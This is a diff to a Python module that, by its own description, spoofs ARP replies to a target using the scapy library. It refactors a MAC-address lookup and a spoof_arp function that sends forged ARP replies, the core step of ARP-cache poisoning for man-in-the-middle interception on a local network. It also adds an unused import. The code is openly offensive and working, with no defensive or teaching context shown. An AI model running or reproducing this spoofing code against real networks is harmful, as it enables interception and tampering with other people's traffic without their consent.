@@ -6,6 +6,7 @@ This is a module to spoof ARP replies to a target. We are using scapy library.
 
 """
 
+from tempfile import TemporaryDirectory
 from scapy import all as scapy
 
 
@@ -31,18 +32,19 @@ def request_mac_address(ip):
     arp_request_broadcast = broadcast / arp_request
     answered_list = scapy.srp(
         arp_request_broadcast,
-        timeout=1, verbose=False)[0]
+        timeout=2, verbose=False)[0]
 
-    return answered_list[0][1].hwsrc
+    try:
+        answer = answered_list[0][1].hwsrc
+
+    except IndexError:
+        answer = None
+
+    return answer
 
 
-def spoof_arp(target_ip, spoof_ip):
+def spoof_arp(target_ip, target_mac_address, spoof_ip):
     """ Send an ARP packet to an IP with an spoofed IP. """
 
-    mac_address = request_mac_address(target_ip)
-
-    if mac_address:
-        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address,
+    scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address,
                 psrc=spoof_ip), verbose=False)
-    else:
-        print('[!] Could not get MAC address for IP: {}'.format(target_ip))
